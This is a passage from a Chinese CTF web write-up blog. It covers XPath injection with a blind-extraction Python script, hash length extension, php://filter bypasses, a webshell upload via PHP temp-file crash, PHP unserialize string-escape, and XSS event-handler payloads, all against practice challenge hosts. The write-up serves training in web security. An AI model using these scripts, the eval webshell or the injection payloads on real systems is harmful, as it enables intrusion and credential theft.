<td>选取此节点的所有子节点</td>
<td></td>
</tr>
<tr>
<td>/</td>
<td>从根节点选取</td>
<td></td>
</tr>
<tr>
<td>//</td>
<td>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</td>
<td></td>
</tr>
<tr>
<td>.</td>
<td>选取当前节点</td>
<td></td>
</tr>
<tr>
<td>..</td>
<td>选取当前节点的父节点</td>
<td></td>
</tr>
<tr>
<td>@</td>
<td>选取属性或　@*：匹配任何属性节点</td>
<td></td>
</tr>
<tr>
<td>*</td>
<td>匹配任何元素节点</td>
<td></td>
</tr>
</tbody></table>
<p>例如：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>bookstore</td>
<td>选取 bookstore 元素的所有子节点</td>
</tr>
<tr>
<td>/bookstore</td>
<td>选取根元素 bookstore</td>
</tr>
<tr>
<td>bookstore/book</td>
<td>选取属于 bookstore 的子元素的所有 book 元素</td>
</tr>
<tr>
<td>//book</td>
<td>选取所有 book 子元素,而不管它们在文档中的位置</td>
</tr>
<tr>
<td>bookstore//book</td>
<td>选择属于 bookstore 元素的后代的所有 book 元素,而不管它们位于 bookstore 之下的什么位置</td>
</tr>
<tr>
<td>//@lang</td>
<td>选取名为 lang 的所有属性</td>
</tr>
</tbody></table>
<p>2.限定语：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>/bookstore/book[1]</td>
<td>选取属于 bookstore 子元素的第一个 book 元素</td>
</tr>
<tr>
<td>/bookstore/book[last()]</td>
<td>选取属于 bookstore 子元素的最后一个 book 元素</td>
</tr>
<tr>
<td>//title[@lang]</td>
<td>选取所有拥有名为 lang 的属性的 title 元素</td>
</tr>
<tr>
<td>//title[@lang=’eng’]</td>
<td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性</td>
</tr>
<tr>
<td>/bookstore/book[price&gt;35.00]/title</td>
<td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00</td>
</tr>
</tbody></table>
<p>3.通配符：</p>
<table>
<thead>
<tr>
<th>通配符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配任何元素节点</td>
</tr>
<tr>
<td>@*</td>
<td>匹配任何属性节点</td>
</tr>
<tr>
<td>node()</td>
<td>匹配任何类型的节点</td>
</tr>
</tbody></table>
<p>4.运算符：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>计算两个节点集</td>
</tr>
<tr>
<td>+、-、*、div</td>
<td>加、减、乘、除</td>
</tr>
<tr>
<td>=</td>
<td>等于</td>
</tr>
<tr>
<td>!=</td>
<td>不等于</td>
</tr>
<tr>
<td>&lt;、&lt;=、&gt;、&gt;=</td>
<td>小于、小于等于、大于、大于等于</td>
</tr>
<tr>
<td>or</td>
<td>或</td>
</tr>
<tr>
<td>and</td>
<td>与</td>
</tr>
<tr>
<td>mod</td>
<td>求余</td>
</tr>
</tbody></table>
<p>5.函数：</p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>text()</td>
<td>元素值</td>
</tr>
<tr>
<td>position()</td>
<td>标签位置</td>
</tr>
<tr>
<td>name()</td>
<td>标签名称</td>
</tr>
</tbody></table>
<h3 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h3><p>例：users.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">"md5"</span>&gt;</span>0192023a7bbd73250516f069df18b500<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>jack<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">"md5"</span>&gt;</span>1d6c1e168e362bc0092f247399003a88<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>tony<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">"md5"</span>&gt;</span>cc20f43c8c24dbc0b2539489b113277a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>xml.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = simplexml_load_file(<span class="string">'users.xml'</span>);</span><br><span class="line">$name = $_GET[<span class="string">'u'</span>];</span><br><span class="line">$pwd = md5($_GET[<span class="string">'p'</span>]);</span><br><span class="line">$query = <span class="string">"/root/users/user[username/text()='"</span>.$name.<span class="string">"' and password/text()='"</span>.$pwd.<span class="string">"']"</span>;</span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line">$result = $xml-&gt;xpath($query);</span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h2&gt;Welcome&lt;/h2&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br /&gt;ID:'</span>.$value-&gt;id;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br /&gt;Username:'</span>.$value-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查询语句为：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="string">"/root/users/user[username/text()='"</span>.$name.<span class="string">"' and password/text()='"</span>.$pwd.<span class="string">"']"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>当使用万能密码：<code>admin&#39; or &#39;1</code>，这样被拼接为:</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">/root/users/user[username/<span class="built_in">text</span>()=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="string">'1'</span> <span class="keyword">and</span> ...</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/29/CTF-WEB/1587537540177.png" alt="1587537540177"></p>
<blockquote>
<p>当我们不知道用户名是，只需要再添加一个or就可以了<code>&#39; or 1 or &#39;1</code></p>
</blockquote>
<p><img src="/2020/04/29/CTF-WEB/1587537688223.png" alt="1587537688223"></p>
<blockquote>
<p>节点遍历</p>
</blockquote>
<p>payload</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">admin'] | <span class="string">//</span>* | <span class="string">//</span>*['<span class="string">"p = "</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/29/CTF-WEB/1587537859815.png" alt="1587537859815"></p>
<h3 id="xpath布尔盲注"><a href="#xpath布尔盲注" class="headerlink" title="xpath布尔盲注"></a>xpath布尔盲注</h3><p>1.判断节点数量</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">' <span class="keyword">or</span> <span class="built_in">count</span>(/)=<span class="number">1</span> <span class="keyword">or</span> '<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>count(/)=1</code> 一直到 <code>count(/)=n</code>，判断出根节点有几个<br>2.获取根节点名<br>先获取长度</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">' <span class="keyword">or</span> <span class="built_in">string</span>-<span class="built_in">length</span>(<span class="built_in">name</span>(/*[<span class="number">1</span>]))=<span class="number">1</span> <span class="keyword">or</span> '</span><br></pre></td></tr></table></figure>

<p><code>string-length(name(/*[1]))=1</code> 一直到 <code>string-length(name(/*[1]))=n</code>，判断出第一个根节点的名字长度<br>获取内容</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">' <span class="keyword">or</span> substring(name(/*[<span class="number">1</span>]), <span class="number">1</span>, <span class="number">1</span>)=<span class="string">'a'</span> <span class="keyword">or</span> '<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>先判断节点数量</p>
<blockquote>
<p>‘ or count(/)=1 or ‘1</p>
</blockquote>
<p><img src="/2020/04/29/CTF-WEB/1587538382126.png" alt="1587538382126"></p>
<blockquote>
<p>‘ or count(/)=2 or ‘1</p>
</blockquote>
<p><img src="/2020/04/29/CTF-WEB/1587538614776.png" alt="1587538614776"></p>
<p>判断有两个节点<br>接下来就可以写一个脚本来跑，但是必须要获取一下token，因为没过几秒就或过期</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">SESSION = requests.session()</span><br><span class="line">strs = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890'</span></span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>:<span class="string">'application/xml'</span>&#125;</span><br><span class="line">pat = <span class="string">'&lt;input type="hidden" id="token" value="(.*?)" /&gt;'</span></span><br><span class="line">finallresult = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        url = <span class="string">'http://6f3a4c27-52fb-486a-8091-42287feda8fc.node3.buuoj.cn/login.php'</span></span><br><span class="line">        res = SESSION.get(url=url)</span><br><span class="line">        token = re.compile(pat).findall(res.text)</span><br><span class="line">        <span class="comment">#print(token)</span></span><br><span class="line">        <span class="comment"># 第一个根节点为root</span></span><br><span class="line">        <span class="comment">#payload = "&lt;username&gt;' or substring(name(/*[1]), "+str(i)+", 1)='"+str(j)+"' or '1&lt;/username&gt;&lt;password&gt;ddd&lt;/password&gt;&lt;token&gt;"+token[0]+"&lt;/token&gt;"</span></span><br><span class="line">        <span class="comment"># 第二个节点为accounts</span></span><br><span class="line">        <span class="comment">#payload2 = "&lt;username&gt;' or substring(name(/root/*[1]),"+str(i)+", 1)='"+str(j)+"' or '1&lt;/username&gt;&lt;password&gt;ddd&lt;/password&gt;&lt;token&gt;"+token[0]+"&lt;/token&gt;"</span></span><br><span class="line">        <span class="comment"># 第三个节点为user</span></span><br><span class="line">        <span class="comment">#payload3 = "&lt;username&gt;' or substring(name(/root/accounts/*[1]), "+str(i)+", 1)='"+str(j)+"' or '1&lt;/username&gt;&lt;password&gt;ddd&lt;/password&gt;&lt;token&gt;"+token[0]+"&lt;/token&gt;"</span></span><br><span class="line">        <span class="comment"># 遍历[1][2][3],在user节点下得到id，username，password</span></span><br><span class="line">        <span class="comment">#payload4 = "&lt;username&gt;' or substring(name(/root/accounts/user/*[3]), "+str(i)+", 1)='"+str(j)+"' or '1&lt;/username&gt;&lt;password&gt;ddd&lt;/password&gt;&lt;token&gt;"+token[0]+"&lt;/token&gt;"</span></span><br><span class="line">        <span class="comment">#得到两个username  guest 和 adm1n</span></span><br><span class="line">        <span class="comment">#payload5 = "&lt;username&gt;' or substring(/root/accounts/user[2]/username/text(),"+str(i)+",1)='" + str(j) + "' or '1&lt;/username&gt;&lt;password&gt;ddd&lt;/password&gt;&lt;token&gt;" + token[0] + "&lt;/token&gt;"</span></span><br><span class="line">        <span class="comment">#解密后得到两个用户的密码为 123456 和 gtfly123</span></span><br><span class="line">        payload6 = <span class="string">"&lt;username&gt;' or substring(/root/accounts/user[2]/password/text(),"</span> + str(i) + <span class="string">",1)='"</span> + str(j) + <span class="string">"' or '1&lt;/username&gt;&lt;password&gt;ddd&lt;/password&gt;&lt;token&gt;"</span> + token[<span class="number">0</span>] + <span class="string">"&lt;/token&gt;"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(payload2)</span></span><br><span class="line">        result = SESSION.post(url=url,headers=headers,data=payload6)</span><br><span class="line">        <span class="comment">#print(result.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'非法操作!'</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            finallresult+=j</span><br><span class="line">            print(finallresult)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure>

<p>这里要注意发送请求的时候带上session，并且url后面加上login.php。在这两个地方被坑惨了。还有个地方就是要在最后用sleep函数休眠一段时间，不然因为跑得太快就会返回一个空token列表，然后报错，可能因计算机而异吧</p>
<p>第一个节点<br><img src="/2020/04/29/CTF-WEB/1587541554243.png" alt="1587541554243"></p>
<p>第二个节点</p>
<p><img src="/2020/04/29/CTF-WEB/1587542679751.png" alt="1587542679751"></p>
<p>第三个节点<br><img src="/2020/04/29/CTF-WEB/1587542868654.png" alt="1587542868654"></p>
<p>跑密码<br><img src="/2020/04/29/CTF-WEB/1587543651365.png" alt="1587543651365"></p>
<p>登陆后使用PHP伪协议读取flag，但是不允许出现php，base，等字符,可以通过大小写来绕过</p>
<blockquote>
<p>file=Php://Filter/Read=convert.BAse64-encode/resource=/flag</p>
</blockquote>
<p><img src="/2020/04/29/CTF-WEB/1587544665138.png" alt="1587544665138"></p>
<p><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/" target="_blank" rel="noopener">Xpath注入指北</a></p>
<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>复现<br>右键源码发现<code>&lt;!--md5($secret.$name)===$pass --&gt;</code>,这里可以使用hash拓展攻击。<br>参考链接：<a href="https://www.bbsmax.com/A/x9J21XAEz6/" target="_blank" rel="noopener">https://www.bbsmax.com/A/x9J21XAEz6/</a></p>
<p>附上一位师傅的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url=<span class="string">'http://ha1cyon-ctf.fun:30004/'</span>,</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">'a3dabbc779f2fbf8b6f56113ca78a7f9'</span>,<span class="string">'123444'</span>,<span class="string">'1'</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username/password error'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(req.text,url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br></pre></td></tr></table></figure>



<p>但是发现在使用脚本的时候一些模块始终安装不成功，正准备放弃，又发现一位师傅的wp上说直接随便输入一个用户名然后把更新的cookie作为密码就可以过了。于是….<br><img src="/2020/04/29/CTF-WEB/1587780891269.png" alt="1587780891269"></p>
<p>访问跳转的链接，发现直接跳转到404页面，那么可以抓包访问，之后得到文件包含<br><img src="/2020/04/29/CTF-WEB/1587781172354.png" alt="1587781172354"></p>
<p>接着尝试伪协议读取文件，但是发现禁用了很多协议,然后可以扫一下有哪些文件，最后发现了一个dir.php<br>使用php://filter读出来。发现是枚举tmp目录下的文件的<br><img src="/2020/04/29/CTF-WEB/1587782215974.png" alt="1587782215974"></p>
<p>参考文章：<a href="https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/</a><br>利用php7 segment fault特性php://filter/string.strip_tags/resource在文件包含处使用会导致php崩溃，从而留下临时文件，我们可以通过这里上传webshell<br>使用python上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">file_data=&#123;</span><br><span class="line"> <span class="string">'file'</span>: <span class="string">"&lt;?php eval($_POST[1]);"</span></span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://298a4fac-4f81-46c0-84dd-2815720dbec6.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"> r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"> print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>之后访问dir.php得到文件名<br><img src="/2020/04/29/CTF-WEB/1588084773450.png" alt="1588084773450"></p>
<p>之后使用文件包含访问便可以getshell<br><img src="/2020/04/29/CTF-WEB/1588084998895.png" alt="1588084998895"></p>
<p><a href="https://xzlxr.github.io/2020/04/26/2020-4%E6%AF%94%E8%B5%9B%E4%B8%8E%E5%88%B7%E9%A2%98/#NPUCTF-2020" target="_blank" rel="noopener">参考链接</a></p>
<h1 id="安恒4月赛"><a href="#安恒4月赛" class="headerlink" title="安恒4月赛"></a>安恒4月赛</h1><h2 id="Ezunserialize"><a href="#Ezunserialize" class="headerlink" title="Ezunserialize"></a>Ezunserialize</h2><p>进去得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure>

<p>首先在C类里面有个<code>__tostring()</code>方法，它可以输出<code>file_get_contents($this-&gt;c)</code>.如果让$this-&gt;c等于flag.php，那么便可以得到flag。<br><code>__tostring()</code>方法被调用的条件为<code>当一个类的实例对象；被当成一个字符串输出时调用</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;c;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> C;</span><br><span class="line">$d-&gt;c = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/29/CTF-WEB/1587796639986.png" alt="1587796639986"></p>
<p>但是</p>
<blockquote>
<p>$a = new A($_GET[‘a’],$_GET[‘b’]);<br>$b = unserialize(read(write(serialize($a))));</p>
</blockquote>
<p>并不能使我们想传什么就传什么，即不能传入<code>flag.php</code>.<br>但是在开头有两个方法，将一些字符换替换后个数与替换前不一致，导致了字符逃逸。<br>测试后发现其会将三个<code>\0</code>替换为<code>*</code>，其中还有两个看不见的字符chr(0)就是剪短3个字符，就相当于一个<code>\0\0\0</code>会多出来三个字符<br><img src="/2020/04/29/CTF-WEB/1587799415474.png" alt="1587799415474"></p>
<p>先将我们需要拼接的payload输出出来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'123'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> C();</span><br><span class="line">$d-&gt;c = <span class="string">"flag.php"</span>;</span><br><span class="line">$v = <span class="keyword">new</span> B();</span><br><span class="line">$v-&gt;b = $d;</span><br><span class="line"><span class="keyword">echo</span> serialize($v);</span><br></pre></td></tr></table></figure>

<p>得到</p>
<blockquote>
<p>O:1:”B”:1:{s:1:”b”;O:1:”C”:1:{s:1:”c”;s:8:”flag.php”;}}</p>
</blockquote>
<p>输出一下<code>read(write(serialize($a)));</code>后的结果，将我们的payload拼接到password后面。如下图，现在的目的就是将选中的那一串吃掉,一共27个字符，所以要构造9个<code>\0\0\0</code>.<br><img src="/2020/04/29/CTF-WEB/1587861559149.png" alt="1587861559149"></p>
<p>最终构造结果</p>
<blockquote>
<p>?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=1111”;O:1:”B”:1:{s:1:”b”;O:1:”C”:1:{s:1:”c”;s:8:”flag.php”;}}</p>
</blockquote>
<h1 id="Hacker101CTF"><a href="#Hacker101CTF" class="headerlink" title="Hacker101CTF"></a><a href="https://ctf.hacker101.com/" target="_blank" rel="noopener">Hacker101CTF</a></h1><h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p>打开什么都没有，查看源码发现有个background.png，访问得到flag<br><img src="/2020/04/29/CTF-WEB/1588057945968.png" alt="1588057945968"></p>
<h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h2><p>这是一个可以编辑的页面，在编辑页面提示<code>Markdownis supported, but scripts are not</code>,所以应该要让其弹窗。但是过滤了script，所以使用</p>
<blockquote>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"#"</span> <span class="attribute">onerror</span>=alert('xss')&gt; 			#当图像加载失败是弹框</span><br><span class="line">&lt;button <span class="attribute">onfocus</span>=alert(1) autofocus&gt;</span><br><span class="line">&lt;input <span class="attribute">onclick</span>=<span class="string">"alert(document.domain)"</span>&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/04/29/CTF-WEB/1588058921239.png" alt="1588058921239"></p>
<p>然后在标题的地方使用<code>&lt;img src=&quot;#&quot; onerror=alert(&#39;xss&#39;)&gt;</code>返回首页时又出来一个flag<br><img src="/2020/04/29/CTF-WEB/1588060302136.png" alt="1588060302136"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow36D&amp;&amp;网鼎杯AreUSerialz</title>
    <url>/2020/05/11/ctfshow36d/</url>
    <content><![CDATA[<p><strong>CTFshow36D&amp;&amp;网鼎杯AreUSerialz</strong></p>
<p><strong>朴实无华1</strong><br>知识点：PHP精度绕过、MD5爆破(三重md5)、RCE绕过</p>
<p><strong>朴实无华2</strong><br>知识点：</p>
<p><strong>WEB_你取吧</strong><br>知识点：无字母数字webshell</p>
<p><strong>WEB_ ALL_ INFO U_ WANT</strong><br>知识点：日志包含</p>
<p><strong>WEB_给你shell</strong><br>知识点：PHP黑魔法 <code>require</code></p>
<p><strong>WEB_ Login_ Only_ For_ 36D</strong><br>知识点：<code>\</code>注释掉单引号，后面进行盲注，使用 LIKE BINARY代替=</p>
<p><strong>WEB RemoteImageDownloader</strong><br>知识点：<a href="https://www.anquanke.com/post/id/86371" target="_blank" rel="noopener">PhantomJS图片渲染中的SSRF/本地文件读取漏洞</a></p>
<p><strong>[网鼎杯2020]AreUSerialz</strong><br>知识点：php反序列化</p>
<a id="more"></a>

<h1 id="CTFshow-36D"><a href="#CTFshow-36D" class="headerlink" title="CTFshow 36D"></a>CTFshow 36D</h1><h2 id="朴实无华1"><a href="#朴实无华1" class="headerlink" title="朴实无华1"></a>朴实无华1</h2><p>给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span 